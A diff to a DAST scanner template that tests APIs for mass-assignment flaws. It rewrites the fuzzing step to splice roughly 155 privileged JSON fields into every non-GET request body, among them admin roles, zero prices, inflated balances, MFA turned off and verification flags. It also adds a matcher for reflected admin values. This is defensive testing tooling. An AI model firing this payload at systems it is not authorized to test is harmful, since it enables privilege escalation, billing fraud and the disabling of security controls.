@@ -3,7 +3,7 @@ info:
   name: API3 Broken Object Property Authorization - Privileged Field Injection (wordlist)
   author: dast-scanner
   severity: critical
-  description: 'Injects a broad, categorized wordlist of commonly server-controlled / privileged property names into every non-GET body, on top of whatever the client actually sent, and reports every acceptance. Two things fire together: (1) a keys-regex pass that OVERWRITES any of these names if they already exist in the body with a placeholder/normal value, and (2) a postfix pass that INJECTS the full set as new fields even if the client-facing schema never declared them. Covers authorization/role, financial, ownership/identity, verification/moderation, account-state, quota/limit, audit/system, feature-flag, and security-control field families, each with camelCase, snake_case, and bare variants.'
+  description: 'Injects a broad, categorized wordlist of commonly server-controlled / privileged property names into every non-GET body, on top of whatever the client actually sent, and reports acceptance. FIXED: the injection pass previously used type: postfix with no keys-regex, which appends to the END OF AN EXISTING VALUE (e.g. email:"a@b.com,\"role\":\"admin\""), producing a garbage string field instead of a real JSON key -- this is exactly how a real POST /api/Users role:admin mass-assignment got missed in testing. Rewritten to splice the fields in at the correct JSON position via replace-regex on the body''s trailing ''}'', which actually produces valid sibling keys. Two passes: (1) overwrite any of the 114 known names if the client already sent them, (2) inject the full 155-field set as new top-level keys before the closing brace. A named reflected-privileged-value matcher is included alongside the bare acceptance matcher so a downstream agent can tell ''got 2xx'' apart from ''got 2xx AND the injected privilege value or an admin JWT roundtrips back'' (verify escalation by decoding any JWT/session in the response, not just the status code).'
   classification:
     cwe-id: CWE-915
   tags: api,owasp-api3,mass-assignment,property-authorization,privilege-escalation,dast
@@ -44,11 +44,26 @@ http:
     condition: and
   fuzzing:
   - part: body
-    type: postfix
+    type: replace-regex
     mode: single
+    values:
+    - \}\s*$
+    replace-regex: \}\s*$
     fuzz:
-    - '{{privileged_fields_json}}'
+    - ',"role":"admin","roles":["admin"],"userRole":"admin","user_role":"admin","isAdmin":true,"is_admin":true,"admin":true,"administrator":true,"isSuperuser":true,"is_superuser":true,"superuser":true,"isStaff":true,"is_staff":true,"isRoot":true,"is_root":true,"isOwner":true,"is_owner":true,"permissions":["*"],"permission":"*","scope":"admin","scopes":["admin"],"grants":["*"],"privilege":"admin","privileges":["admin"],"accessLevel":"admin","access_level":"admin","authLevel":9999,"clearanceLevel":9999,"tier":"enterprise","accountType":"admin","account_type":"admin","membershipTier":"premium","plan":"enterprise","price":0,"amount":0,"cost":0,"total":0,"totalAmount":0,"subtotal":0,"discount":100,"discountPercent":100,"tax":0,"fee":0,"fees":0,"balance":999999,"credit":999999,"credits":999999,"walletBalance":999999,"wallet_balance":999999,"points":999999,"loyaltyPoints":999999,"refundAmount":999999,"creditLimit":999999,"credit_limit":999999,"ownerId":1,"owner_id":1,"userId":1,"user_id":1,"accountId":1,"account_id":1,"organizationId":1,"organization_id":1,"tenantId":1,"tenant_id":1,"createdBy":1,"created_by":1,"assignedTo":1,"assigned_to":1,"customerId":1,"customer_id":1,"verified":true,"isVerified":true,"is_verified":true,"emailVerified":true,"email_verified":true,"phoneVerified":true,"kycVerified":true,"kyc_verified":true,"approved":true,"isApproved":true,"is_approved":true,"status":"approved","state":"approved","reviewStatus":"approved","moderationStatus":"approved","published":true,"isPublished":true,"flagged":false,"is_flagged":false,"banned":false,"is_banned":false,"suspended":false,"is_suspended":false,"blocked":false,"is_blocked":false,"active":true,"isActive":true,"is_active":true,"enabled":true,"isEnabled":true,"is_enabled":true,"disabled":false,"is_disabled":false,"locked":false,"isLocked":false,"is_locked":false,"trial":false,"isTrial":false,"trialExpired":false,"subscriptionActive":true,"limit":999999,"maxLimit":999999,"quota":999999,"rateLimit":999999,"rate_limit":999999,"maxUsers":999999,"maxRequests":999999,"usageLimit":999999,"storageLimit":999999,"apiCallsRemaining":999999,"readOnly":false,"read_only":false,"immutable":false,"internal":false,"isInternal":false,"is_internal":false,"isSystem":false,"is_system":false,"isTest":false,"debug":false,"isDeleted":false,"is_deleted":false,"deletedAt":null,"expiresAt":"2099-12-31T23:59:59Z","expires_at":"2099-12-31T23:59:59Z","validUntil":"2099-12-31T23:59:59Z","createdAt":"1970-01-01T00:00:00Z","updatedAt":"1970-01-01T00:00:00Z","featureFlags":["all"],"feature_flags":["all"],"beta":true,"isBeta":true,"earlyAccess":true,"whitelisted":true,"isWhitelisted":true,"is_whitelisted":true,"blacklisted":false,"twoFactorEnabled":false,"mfaEnabled":false,"mfa_required":false,"passwordResetRequired":false,"forcePasswordChange":false,"sessionTimeout":999999,"apiKeyEnabled":true,"ssoOnly":false}'
   matchers:
   - type: dsl
+    name: accepted
     dsl:
     - status_code >= 200 && status_code < 400
+  - type: word
+    name: reflected-privileged-value
+    part: body
+    words:
+    - '"role":"admin"'
+    - '"isAdmin":true'
+    - '"is_admin":true'
+    - '"approved"'
+    - '"admin"'
+    condition: or
+  matchers-condition: or
